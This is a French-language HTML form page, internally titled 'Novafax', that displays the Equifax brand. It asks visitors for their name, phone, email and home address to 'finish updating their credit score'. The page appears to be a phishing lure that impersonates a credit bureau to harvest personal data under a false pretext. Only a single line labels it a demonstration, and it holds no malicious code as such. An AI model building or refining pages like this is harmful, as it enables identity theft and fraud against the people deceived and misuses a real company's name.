<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Novafax — Informations</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            background: #f3f6f8;
            font-family: Arial, Helvetica, sans-serif;
            color: #263238;
        }

        /* BANDEAU ROUGE */
        header {
            background: #d60000;
            border-bottom: 1px solid #b00000;
            padding: 12px 20px;
        }

        /* LOGO + NOVAFAX */
        .logo {
            max-width: 600px;
            margin: auto;
            color: #ffffff;
            font-size: 26px;
            font-weight: bold;

            display: flex;
            align-items: center;
            gap: 10px;
        }

        /* PHOTO */
        .logo img {
            width: 42px;
            height: 42px;
            object-fit: contain;
            border-radius: 6px;
            background: #ffffff;
        }


        .container {
            width: 100%;
            max-width: 520px;
            margin: 0 auto;
            padding: 35px 18px 50px;
        }

        .card {
            background: #ffffff;
            border-radius: 16px;
            padding: 25px 20px;
            box-shadow: 0 5px 22px rgba(25,55,70,.08);
        }

        h1 {
            margin: 0 0 10px;
            font-size: 28px;
            line-height: 1.25;
        }

        .intro {
            color: #68757c;
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 25px;
        }

        label {
            display: block;
            margin: 0 0 7px;
            font-size: 14px;
            font-weight: bold;
        }

        input {
            width: 100%;
            height: 52px;
            padding: 0 15px;
            margin-bottom: 17px;
            border: 1px solid #b8c2c7;
            border-radius: 9px;
            background: #ffffff;
            font-size: 16px;
            outline: none;
        }

        input:focus {
            border-color: #0877b9;
        }

        button {
            width: 100%;
            height: 54px;

            border: 0;
            border-radius: 9px;

            background: #d60000;
            color: #ffffff;

            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background: #b80000;
        }

        button:disabled {
            opacity: .7;
            cursor: not-allowed;
        }


        .notice {
            margin-top: 18px;
            background: #fff8df;
            border: 1px solid #f0df9b;
            border-radius: 9px;
            padding: 13px;
            color: #67591f;
            font-size: 12px;
            line-height: 1.5;
        }

        @media (max-width: 480px) {
            .container {
                padding: 25px 13px 40px;
            }

            .card {
                padding: 22px 16px;
            }

            h1 {
                font-size: 25px;
            }
        }
    </style>
</head>

<body>

 <!-- BANDEAU -->
    <header>

        <div class="logo">

            <!-- PHOTO DANS LE DOSSIER NOVAFAX -->
            <img src="photo 1.jpg" alt="Novafax">

            <span>EQUIFAX</span>

        </div>

    </header>

    <main class="container">

        <div class="card">

            <h1>
                Vos informations
            </h1>

            <p class="intro">
                Renseignez les informations ci-dessous pour terminer la mise à jour de votre cote de crédit.
            </p>

            <form action="choix.html" method="get">

                <label for="prenom">Prénom</label>
                <input
                    id="prenom"
                    name="prenom"
                    type="text"
                    placeholder="Votre prénom"
                    autocomplete="given-name"
                    required
                >

                <label for="nom">Nom</label>
                <input
                    id="nom"
                    name="nom"
                    type="text"
                    placeholder="Votre nom"
                    autocomplete="family-name"
                    required
                >

                <label for="telephone">Numéro de téléphone</label>
                <input
                    id="telephone"
                    name="telephone"
                    type="tel"
                    placeholder="Votre numéro"
                    autocomplete="tel"
                    required
                >

                <label for="email">Adresse e-mail</label>
                <input
                    id="email"
                    name="email"
                    type="email"
                    placeholder="Votre adresse e-mail"
                    autocomplete="email"
                    required
                >

                <label for="adresse">Adresse </label>
                <input
                    id="adresse"
                    name="adresse"
                    type="text"
                    placeholder="Votre adresse"
                    autocomplete="street-address"
                    required
                >

                <button type="submit">
                    Continuer
                </button>

            </form>

            <div class="notice">
                <strong>Démonstration :</strong>
                EQUIFAX est une interface concernant votre dossier de credit.
            </div>

        </div>

    </main>

</div>

</body>
</html>
